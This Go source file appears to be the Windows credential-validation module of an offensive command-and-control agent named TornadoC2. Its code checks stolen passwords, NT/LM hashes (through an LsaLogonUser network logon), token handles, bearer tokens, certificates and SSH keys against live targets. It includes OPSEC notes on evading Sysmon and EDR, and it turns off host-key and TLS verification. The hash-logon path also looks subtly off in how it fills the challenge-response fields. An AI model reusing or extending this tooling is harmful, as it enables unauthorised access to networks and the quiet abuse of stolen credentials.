//go:build windows

package core

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// ---------------------------------------------------------------------
// Win32 bindings

var (
	advapi32                = syscall.NewLazyDLL("advapi32.dll")
	procLogonUserW          = advapi32.NewProc("LogonUserW")
	procGetTokenInformation = advapi32.NewProc("GetTokenInformation")

	// LSA bindings. On modern Windows these live in secur32.dll.
	// A few very old builds exported them from advapi32 as well;
	// secur32 is present on every supported target.
	secur32                  = syscall.NewLazyDLL("secur32.dll")
	procLsaConnectUntrusted  = secur32.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaLogonUser         = secur32.NewProc("LsaLogonUser")
	procLsaFreeReturnBuffer  = secur32.NewProc("LsaFreeReturnBuffer")
	procLsaDeregisterLogon   = secur32.NewProc("LsaDeregisterLogonProcess")
)

const (
	logon32LogonNetwork    = 3
	logon32LogonInteractive = 2
	logon32ProviderDefault = 0
	tokenUser   = 1
	tokenGroups = 2
)

var (
	errnoLogonFailure        = syscall.Errno(1326)
	errnoAccountRestriction  = syscall.Errno(1327)
	errnoInvalidLogonHours   = syscall.Errno(1328)
	errnoInvalidWorkstation  = syscall.Errno(1329)
	errnoPasswordExpired     = syscall.Errno(1330)
	errnoAccountDisabled     = syscall.Errno(1331)
	errnoNoneMapped          = syscall.Errno(1332)
	errnoNoSuchUser          = syscall.Errno(1317)
	errnoLogonTypeNotGranted = syscall.Errno(1385)
	errnoTrustFailure        = syscall.Errno(1789)
	errnoAccountExpired      = syscall.Errno(1793)
	errnoPasswordMustChange  = syscall.Errno(1907)
	errnoAccountLockedOut    = syscall.Errno(1909)
	errnoDCNotFound          = syscall.Errno(1913)
	errnoBadUsername         = syscall.Errno(2202)
	errnoAccessDenied        = syscall.Errno(5)
)

func credValidateDispatch(ctx context.Context, kind, user,
	domain, value, target string) (string, string) {

	switch kind {

	case "plaintext":
		return validatePlaintextW(user, domain, value)

	case "token":
		return validateTokenW(value)

	case "cert":
		return validateCertTLS(user, target, value, true)

	case "bearer":
		return validateBearerHTTP(user, target, value, true)

	case "ntlm":
		return validateNTHashW(user, domain, value, false)

	case "lm":
		return validateNTHashW(user, domain, value, true)

	case "ticket":
		return validateTicketW(value)

	case "aes256", "aes128", "krbtgt":
		return "unsupported",
			fmt.Sprintf(
				"kind %q requires a hand-built Kerberos "+
					"AS-REQ with the raw key; not "+
					"implemented in this build", kind)

	case "ssh_key":
		return validateSSHKeyW(ctx, user, target, value)

	default:
		return "unsupported",
			fmt.Sprintf("kind %q has no validation routine", kind)
	}
}

func validatePlaintextW(user, domain, password string) (string, string) {
	if user == "" {
		return "error", "missing user"
	}

	userP, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return "error", "invalid user string"
	}
	passP, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return "error", "invalid password string"
	}
	var domainP *uint16
	if domain != "" {
		domainP, err = syscall.UTF16PtrFromString(domain)
		if err != nil {
			return "error", "invalid domain string"
		}
	}

	var token syscall.Handle
	ret, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userP)),
		uintptr(unsafe.Pointer(domainP)),
		uintptr(unsafe.Pointer(passP)),
		uintptr(logon32LogonNetwork),
		uintptr(logon32ProviderDefault),
		uintptr(unsafe.Pointer(&token)))

	if ret != 0 {
		if token != 0 {
			procCloseHandle.Call(uintptr(token))
		}
		return "valid", "logon succeeded"
	}

	return mapLogonError(callErr)
}

func mapLogonError(err error) (string, string) {
	if err == nil {
		return "invalid", "logon rejected"
	}
	errno, ok := err.(syscall.Errno)
	if !ok {
		return "invalid", err.Error()
	}
	switch errno {
	case errnoAccountLockedOut:
		return "locked", "account locked out"
	case errnoAccountDisabled:
		return "invalid", "account disabled"
	case errnoAccountExpired:
		return "expired", "account expired"
	case errnoPasswordExpired:
		return "expired", "password expired"
	case errnoPasswordMustChange:
		return "expired", "password must change at next logon"
	case errnoInvalidLogonHours:
		return "invalid", "logon hour restriction"
	case errnoInvalidWorkstation:
		return "invalid", "workstation restriction"
	case errnoAccountRestriction:
		return "invalid", "account restriction"
	case errnoLogonTypeNotGranted:
		return "invalid", "logon type not granted"
	case errnoNoSuchUser:
		return "invalid", "no such user"
	case errnoBadUsername:
		return "invalid", "bad username"
	case errnoDCNotFound:
		return "error", "domain controller not found"
	case errnoTrustFailure:
		return "error", "trust relationship failure"
	case errnoAccessDenied:
		return "invalid", "logon rejected (access denied)"
	case errnoNoneMapped:
		return "invalid", "logon rejected (no account mapped)"
	case errnoLogonFailure:
		return "invalid", "logon failed (bad password)"
	}
	return "invalid",
		fmt.Sprintf("logon failed (error %d)", uint32(errno))
}

func validateTokenW(value string) (string, string) {
	raw, err := base64.StdEncoding.DecodeString(value)
	if err != nil || len(raw) == 0 {
		return "error", "token value is not valid base64"
	}

	var handle uintptr
	switch len(raw) {
	case 8:
		handle = uintptr(uint64(raw[0]) |
			uint64(raw[1])<<8 |
			uint64(raw[2])<<16 |
			uint64(raw[3])<<24 |
			uint64(raw[4])<<32 |
			uint64(raw[5])<<40 |
			uint64(raw[6])<<48 |
			uint64(raw[7])<<56)
	case 4:
		handle = uintptr(uint32(raw[0]) |
			uint32(raw[1])<<8 |
			uint32(raw[2])<<16 |
			uint32(raw[3])<<24)
	default:
		return "error",
			fmt.Sprintf(
				"token handle must be 4 or 8 bytes "+
					"little-endian; got %d", len(raw))
	}

	if handle == 0 {
		return "error", "token handle is zero"
	}

	var bufSize uint32
	_, _, callErr := procGetTokenInformation.Call(
		handle, uintptr(tokenUser), 0, 0,
		uintptr(unsafe.Pointer(&bufSize)))
	if bufSize == 0 {
		if errno, ok := callErr.(syscall.Errno); ok {
			if errno == errnoAccessDenied {
				return "invalid",
					"token not accessible — may be " +
						"closed, or the agent lacks " +
						"the required privilege"
			}
		}
		return "invalid",
			"token is not live (handle closed or invalid)"
	}
	buf := make([]byte, bufSize)
	ret, _, callErr := procGetTokenInformation.Call(
		handle, uintptr(tokenUser),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(bufSize),
		uintptr(unsafe.Pointer(&bufSize)))
	if ret == 0 {
		return "error",
			fmt.Sprintf("GetTokenInformation(TokenUser): %v",
				callErr)
	}

	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	sidStr := sidToString(sidPtr)

	procGetTokenInformation.Call(
		handle, uintptr(tokenGroups), 0, 0,
		uintptr(unsafe.Pointer(&bufSize)))
	groupCount := 0
	if bufSize > 0 {
		gbuf := make([]byte, bufSize)
		if r, _, _ := procGetTokenInformation.Call(
			handle, uintptr(tokenGroups),
			uintptr(unsafe.Pointer(&gbuf[0])),
			uintptr(bufSize),
			uintptr(unsafe.Pointer(&bufSize))); r != 0 {
			if len(gbuf) >= 4 {
				groupCount = int(uint32(gbuf[0]) |
					uint32(gbuf[1])<<8 |
					uint32(gbuf[2])<<16 |
					uint32(gbuf[3])<<24)
			}
		}
	}

	return "valid",
		fmt.Sprintf("token is live; user=%s groups=%d",
			sidStr, groupCount)
}

func sidToString(sid uintptr) string {
	if sid == 0 {
		return ""
	}
	// SID layout:
	//   BYTE  Revision
	//   BYTE  SubAuthorityCount
	//   BYTE  IdentifierAuthority[6]
	//   DWORD SubAuthority[SubAuthorityCount]
	p := (*byte)(unsafe.Pointer(sid))
	revision := *p
	subCount := *(*byte)(unsafe.Pointer(sid + 1))
	if subCount > 15 {
		return ""
	}
	auth := uint64(0)
	for i := 0; i < 6; i++ {
		auth = auth<<8 | uint64(*(*byte)(
			unsafe.Pointer(sid + 2 + uintptr(i))))
	}
	parts := []string{fmt.Sprintf("S-%d-%d",
		revision, auth)}
	for i := 0; i < int(subCount); i++ {
		sub := uint32(*(*uint32)(unsafe.Pointer(
			sid + 8 + uintptr(i)*4)))
		parts = append(parts, fmt.Sprintf("%d", sub))
	}
	return strings.Join(parts, "-")
}

func validateCertTLS(user, target, value string,
	verifyHost bool) (string, string) {

	if target == "" {
		return "error",
			"cert validation requires --target <host:port>"
	}

	cert, err := parseCertValue(value)
	if err != nil {
		return "error", err.Error()
	}

	return tlsClientAuthCheck(target, cert, verifyHost)
}

func parseCertValue(value string) (tls.Certificate, error) {
	if strings.HasPrefix(value, "pfx:") {
		return tls.Certificate{},
			errors.New(
				"PKCS#12 (.pfx) certificates are not supported; " +
					"convert to PEM and re-store")
	}

	// PEM bundle. cert and key are concatenated.
	cert, err := tls.X509KeyPair([]byte(value), []byte(value))
	if err != nil {
		return tls.Certificate{},
			fmt.Errorf(
				"could not parse cert value as PEM (cert + key "+
					"concatenated): %v", err)
	}
	return cert, nil
}

func tlsClientAuthCheck(target string,
	cert tls.Certificate, verifyHost bool) (string, string) {

	cfg := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: !verifyHost,
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", target, cfg)
	if err != nil {
		msg := err.Error()
		if strings.Contains(msg, "certificate") ||
			strings.Contains(msg, "cert") ||
			strings.Contains(msg, "handshake") {
			return "invalid",
				"TLS handshake rejected: " + msg
		}
		return "error", "TLS dial failed: " + msg
	}
	defer conn.Close()

	state := conn.ConnectionState()
	certCount := len(state.PeerCertificates)
	if certCount == 0 {
		return "error",
			"handshake completed but no server certificate " +
				"presented"
	}

	leaf := state.PeerCertificates[0]
	days := int(time.Until(leaf.NotAfter).Hours() / 24)
	if days < 0 {
		return "invalid",
			fmt.Sprintf(
				"handshake completed but server cert expired "+
					"%d days ago (subject=%s)",
				-days, leaf.Subject.CommonName)
	}

	return "valid",
		fmt.Sprintf(
			"TLS handshake accepted; server=%s expires=%dd "+
				"tls=%s", leaf.Subject.CommonName, days,
			tlsVersionString(state.Version))
}

func tlsVersionString(v uint16) string {
	switch v {
	case tls.VersionTLS13:
		return "1.3"
	case tls.VersionTLS12:
		return "1.2"
	case tls.VersionTLS11:
		return "1.1"
	case tls.VersionTLS10:
		return "1.0"
	}
	return fmt.Sprintf("0x%04x", v)
}

func validateBearerHTTP(user, target, value string,
	verifyHost bool) (string, string) {

	url := target
	if url == "" {
		iss := jwtIssuer(value)
		if iss == "" {
			return "error",
				"bearer validation requires --target <url> " +
					"or a JWT with an iss claim"
		}
		url = strings.TrimRight(iss, "/") + "/"
	}

	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		return "error", "could not build request: " + err.Error()
	}
	req.Header.Set("Authorization", "Bearer "+value)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Accept", "*/*")

	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: !verifyHost,
			},
		},
		CheckRedirect: func(req *http.Request,
			via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return "error", "request failed: " + err.Error()
	}
	defer resp.Body.Close()

	io.CopyN(io.Discard, resp.Body, 4096)

	switch resp.StatusCode {
	case http.StatusOK, http.StatusNoContent,
		http.StatusFound, http.StatusMovedPermanently:
		return "valid",
			fmt.Sprintf("HTTP %d from %s", resp.StatusCode, url)
	case http.StatusUnauthorized, http.StatusForbidden:
		return "invalid",
			fmt.Sprintf("HTTP %d from %s — token rejected",
				resp.StatusCode, url)
	}
	return "error",
		fmt.Sprintf("HTTP %d from %s — inconclusive",
			resp.StatusCode, url)
}

func jwtIssuer(token string) string {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return ""
	}
	raw := parts[1]
	if m := len(raw) % 4; m != 0 {
		raw += strings.Repeat("=", 4-m)
	}
	decoded, err := base64.URLEncoding.DecodeString(raw)
	if err != nil {
		return ""
	}
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		return ""
	}
	if iss, ok := claims["iss"].(string); ok {
		return iss
	}
	return ""
}

const (
	msv1_0Lm20LogonMsgType = 2
	securityLogonNetwork   = 3
)

type lsaUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type lsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type msv1_0Lm20Logon struct {
	MessageType                      uint32
	LogonDomainName                  lsaUnicodeString
	UserName                         lsaUnicodeString
	Workstation                      lsaUnicodeString
	ChallengeToClient                [8]byte
	CaseSensitiveChallengeResponse   lsaString
	CaseInsensitiveChallengeResponse lsaString
	ParameterControl                 uint32
}

type tokenSource struct {
	SourceName       [8]byte
	SourceIdentifier int64
}

type quotaLimits struct {
	PagedPoolLimit        uintptr
	NonPagedPoolLimit     uintptr
	MinimumWorkingSetSize uintptr
	MaximumWorkingSetSize uintptr
	PagefileLimit         uintptr
	TimeLimit             int64
}

func validateNTHashW(user, domain, value string,
	isLM bool) (string, string) {

	if user == "" {
		return "error", "missing user"
	}

	raw, err := parseHashValue(value, isLM)
	if err != nil {
		return "error", err.Error()
	}
	if len(raw) != 16 {
		return "error",
			fmt.Sprintf("hash must be 16 bytes (32 hex chars); "+
				"got %d", len(raw))
	}

	var lsaHandle syscall.Handle
	if s := lsaCall(procLsaConnectUntrusted,
		uintptr(unsafe.Pointer(&lsaHandle))); s != 0 {
		return "error",
			fmt.Sprintf("LsaConnectUntrusted: 0x%08X", uint32(s))
	}
	defer procLsaDeregisterLogon.Call(uintptr(lsaHandle))

	pkgName := []byte("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0")
	var pkgID uint32
	lsaPkg := lsaString{
		Length:        uint16(len(pkgName)),
		MaximumLength: uint16(len(pkgName)),
		Buffer:        uintptr(unsafe.Pointer(&pkgName[0])),
	}
	if s := lsaCall(procLsaLookupAuthPackage,
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(&lsaPkg)),
		uintptr(unsafe.Pointer(&pkgID))); s != 0 {
		return "error",
			fmt.Sprintf("LsaLookupAuthenticationPackage: "+
				"0x%08X", uint32(s))
	}

	domainU, domainBuf := toLsaUnicode(strings.ToUpper(domain))
	userU, userBuf := toLsaUnicode(user)
	workstationU, workstationBuf := toLsaUnicode("")

	var lmStr, ntStr lsaString
	var lmBuf, ntBuf []byte
	if isLM {
		lmStr, lmBuf = toLsaByteString(raw)
	} else {
		ntStr, ntBuf = toLsaByteString(raw)
	}

	logon := msv1_0Lm20Logon{
		MessageType:                      msv1_0Lm20LogonMsgType,
		LogonDomainName:                  domainU,
		UserName:                         userU,
		Workstation:                      workstationU,
		CaseSensitiveChallengeResponse:   lmStr,
		CaseInsensitiveChallengeResponse: ntStr,
	}

	originName := []byte("TornadoC2")
	originStr := lsaString{
		Length:        uint16(len(originName)),
		MaximumLength: uint16(len(originName)),
		Buffer:        uintptr(unsafe.Pointer(&originName[0])),
	}
	var sourceCtx tokenSource
	copy(sourceCtx.SourceName[:], []byte("Tornado\x00"))

	var profileBuf uintptr
	var profileLen uint32
	var logonID int64
	var tokenHandle syscall.Handle
	var quota quotaLimits
	var subStatus int32

	status := lsaCall(procLsaLogonUser,
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(&originStr)),
		uintptr(securityLogonNetwork),
		uintptr(pkgID),
		uintptr(unsafe.Pointer(&logon)),
		uintptr(unsafe.Sizeof(logon)),
		0,
		uintptr(unsafe.Pointer(&sourceCtx)),
		uintptr(unsafe.Pointer(&profileBuf)),
		uintptr(unsafe.Pointer(&profileLen)),
		uintptr(unsafe.Pointer(&logonID)),
		uintptr(unsafe.Pointer(&tokenHandle)),
		uintptr(unsafe.Pointer(&quota)),
		uintptr(unsafe.Pointer(&subStatus)))

	runtime.KeepAlive(domainBuf)
	runtime.KeepAlive(userBuf)
	runtime.KeepAlive(workstationBuf)
	runtime.KeepAlive(lmBuf)
	runtime.KeepAlive(ntBuf)
	runtime.KeepAlive(originName)
	runtime.KeepAlive(pkgName)

	if profileBuf != 0 {
		procLsaFreeReturnBuffer.Call(profileBuf)
	}
	if tokenHandle != 0 {
		procCloseHandle.Call(uintptr(tokenHandle))
	}

	if status == 0 {
		return "valid", "hash accepted (network logon succeeded)"
	}
	return mapLsaStatus(status)
}

// parseHashValue accepts three forms:
//   <32 hex>             — a single hash, used for either kind
//   <32 hex>:<32 hex>    — LM:NT, either side may be empty
//   "0x" prefix          — stripped
//
// When the value is a pair, the caller's kind determines which
// half is returned. An ntlm record never receives the LM half,
// and vice versa.
func parseHashValue(value string, isLM bool) ([]byte, error) {
	v := strings.TrimSpace(value)
	v = strings.TrimPrefix(v, "0x")
	v = strings.TrimPrefix(v, "0X")

	if strings.Contains(v, ":") {
		parts := strings.SplitN(v, ":", 2)
		var want, label string
		if isLM {
			want, label = parts[0], "LM"
		} else {
			want, label = parts[1], "NT"
		}
		if want == "" {
			return nil, fmt.Errorf(
				"no %s half in the LM:NT pair", label)
		}
		b, err := hex.DecodeString(want)
		if err != nil {
			return nil, fmt.Errorf("hash is not hex: %v", err)
		}
		if len(b) != 16 {
			return nil, fmt.Errorf(
				"%s hash must be 16 bytes; got %d",
				label, len(b))
		}
		return b, nil
	}

	b, err := hex.DecodeString(v)
	if err != nil {
		return nil, fmt.Errorf("hash is not hex: %v", err)
	}
	return b, nil
}

func lsaCall(proc *syscall.LazyProc, args ...uintptr) int32 {
	ret, _, _ := proc.Call(args...)
	return int32(uint32(ret))
}

func toLsaUnicode(s string) (lsaUnicodeString, []uint16) {
	if s == "" {
		return lsaUnicodeString{}, nil
	}
	u := utf16.Encode([]rune(s))
	buf := make([]uint16, len(u)+1)
	copy(buf, u)
	return lsaUnicodeString{
		Length:        uint16(len(u) * 2),
		MaximumLength: uint16((len(u) + 1) * 2),
		Buffer:        uintptr(unsafe.Pointer(&buf[0])),
	}, buf
}

func toLsaByteString(b []byte) (lsaString, []byte) {
	if len(b) == 0 {
		return lsaString{}, nil
	}
	buf := make([]byte, len(b))
	copy(buf, b)
	return lsaString{
		Length:        uint16(len(b)),
		MaximumLength: uint16(len(b)),
		Buffer:        uintptr(unsafe.Pointer(&buf[0])),
	}, buf
}

// mapLsaStatus translates the NTSTATUS values LsaLogonUser can
// return into the vault's status vocabulary. These are different
// from the Win32 error codes LogonUserW returns — the plaintext
// path uses the Win32 table above, this path uses the NTSTATUS
// table.
func mapLsaStatus(status int32) (string, string) {
	switch uint32(status) {
	case 0xC0000064:
		return "invalid", "no such user"
	case 0xC000006D:
		return "invalid", "logon failure (bad hash or unknown account)"
	case 0xC000006E:
		return "invalid", "account restriction"
	case 0xC000006F:
		return "invalid", "logon hour restriction"
	case 0xC0000070:
		return "invalid", "workstation restriction"
	case 0xC0000071:
		return "expired", "password expired"
	case 0xC0000072:
		return "invalid", "account disabled"
	case 0xC0000073:
		return "invalid", "no account mapped"
	case 0xC000015B:
		return "invalid", "logon type not granted"
	case 0xC000018B:
		return "error", "trusted relationship failure"
	case 0xC0000193:
		return "expired", "account expired"
	case 0xC0000224:
		return "expired", "password must change at next logon"
	case 0xC0000234:
		return "locked", "account locked out"
	case 0xC000005E:
		return "error", "no logon servers available"
	}
	return "error", fmt.Sprintf("LSA status 0x%08X", uint32(status))
}

// ---------------------------------------------------------------------
// ticket — structural validation
//
// No LSA injection, no KDC contact, no elevation. The ticket blob
// is parsed in memory and the cleartext envelope is reported back.
// A ccache ticket carries its start / end times, so expiry is
// verifiable; a kirbi ticket does not, so the result says so.

func validateTicketW(value string) (string, string) {
	raw, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return "error", "ticket is not valid base64"
	}
	if len(raw) == 0 {
		return "error", "empty ticket"
	}
	info, err := parseTicket(raw)
	if err != nil {
		return "invalid", "ticket parse failed: " + err.Error()
	}
	return formatTicketResult(info)
}

func formatTicketResult(info ticketInfo) (string, string) {
	id := info.Realm + "\\" + info.Server
	if info.Server == "" {
		id = info.Realm
	}
	if info.HasTimes {
		remaining := time.Until(info.EndTime)
		if remaining < 0 {
			return "expired", fmt.Sprintf(
				"%s ticket for %s expired %s ago",
				info.Format, id, (-remaining).Round(time.Second))
		}
		return "valid", fmt.Sprintf(
			"%s ticket for %s; expires in %s",
			info.Format, id, remaining.Round(time.Second))
	}
	return "valid", fmt.Sprintf(
		"%s ticket for %s; %s", info.Format, id, info.Note)
}

// ---------------------------------------------------------------------
// ssh_key — Windows OpenSSH client
//
// The Go stdlib has no SSH client; adding one (golang.org/x/crypto
// /ssh) would violate the agent's stdlib-only policy. The check
// shells out to the system OpenSSH client that ships with Windows
// 10 1809 and later.
//
// OPSEC: this is the least quiet check in the file. The ssh.exe
// child process is visible to Sysmon EventID 1 and to any EDR
// that hooks process creation. The key is written to a temp file
// opened with FILE_FLAG_DELETE_ON_CLOSE and held open for the
// child's lifetime, so the on-disk window is bounded to the run.
// No better option exists without a dependency.

func validateSSHKeyW(ctx context.Context, user, target,
	keyPem string) (string, string) {

	if target == "" {
		return "error",
			"ssh_key validation requires --target <host[:port]>"
	}
	if user == "" {
		user = "root"
	}
	if keyPem == "" {
		return "error", "empty SSH key"
	}

	sshPath := findSSHBinaryW()
	if sshPath == "" {
		return "error",
			"ssh.exe not found; install the Windows OpenSSH " +
				"client (Settings > Apps > Optional features)"
	}

	keyPath, keyHandle, err := stageKeyFileW(keyPem)
	if err != nil {
		return "error", "could not stage key: " + err.Error()
	}
	defer syscall.CloseHandle(keyHandle)

	args := []string{
		"-i", keyPath,
		"-o", "BatchMode=yes",
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=nul",
		"-o", "ConnectTimeout=8",
		"-o", "PreferredAuthentications=publickey",
		"-o", "IdentitiesOnly=yes",
		user + "@" + target,
		"true",
	}

	cmd := exec.CommandContext(ctx, sshPath, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	out, err := cmd.CombinedOutput()
	text := strings.TrimSpace(string(out))

	if err == nil {
		return "valid", fmt.Sprintf(
			"SSH public-key auth succeeded for %s@%s",
			user, target)
	}

	low := strings.ToLower(text)
	switch {
	case strings.Contains(low, "permission denied"):
		return "invalid", "SSH key rejected: " + firstLine(text)
	case strings.Contains(low, "connection refused"),
		strings.Contains(low, "connection timed out"),
		strings.Contains(low, "no route to host"),
		strings.Contains(low, "could not resolve"):
		return "error", "SSH connect failed: " + firstLine(text)
	}
	return "error", "ssh exited nonzero: " + firstLine(text)
}

func findSSHBinaryW() string {
	candidates := []string{
		`C:\Windows\System32\OpenSSH\ssh.exe`,
		`C:\Program Files\OpenSSH\ssh.exe`,
		`C:\Program Files\OpenSSH-Win64\ssh.exe`,
	}
	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	if p, err := exec.LookPath("ssh.exe"); err == nil {
		return p
	}
	if p, err := exec.LookPath("ssh"); err == nil {
		return p
	}
	return ""
}

// stageKeyFileW writes the PEM key to a temp file opened with
// FILE_FLAG_DELETE_ON_CLOSE. The returned handle must be kept
// open for the ssh.exe run; closing it deletes the file. The
// file is shared for read so the child can open it while we
// still hold the delete-on-close handle.
func stageKeyFileW(pem string) (string, syscall.Handle, error) {
	dir := os.TempDir()
	if dir == "" {
		dir = `C:\Windows\Temp`
	}
	name := filepath.Join(dir, fmt.Sprintf("tc2-%d-%d.tmp",
		os.Getpid(), time.Now().UnixNano()))
	namePtr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return "", 0, err
	}
	handle, err := syscall.CreateFile(
		namePtr,
		// GENERIC_READ | GENERIC_WRITE | DELETE. The DELETE
		// bit (0x00010000) is what lets FILE_FLAG_DELETE_ON_CLOSE
		// actually fire on close — without it the flag is a
		// no-op and the file persists.
		syscall.GENERIC_WRITE|syscall.GENERIC_READ|0x00010000,
		// FILE_SHARE_READ | FILE_SHARE_DELETE. The child's
		// handle must also participate in the delete, or the
		// file survives until the child exits and the OS
		// finally retires it.
		syscall.FILE_SHARE_READ|0x00000004,
		nil,
		syscall.CREATE_NEW,
		0x04000000, // FILE_FLAG_DELETE_ON_CLOSE
		0,
	)
	if err != nil {
		return "", 0, err
	}
	b := []byte(pem)
	var written uint32
	if err := syscall.WriteFile(handle, b, &written, nil); err != nil {
		syscall.CloseHandle(handle)
		return "", 0, err
	}
	return name, handle, nil
}

func firstLine(s string) string {
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}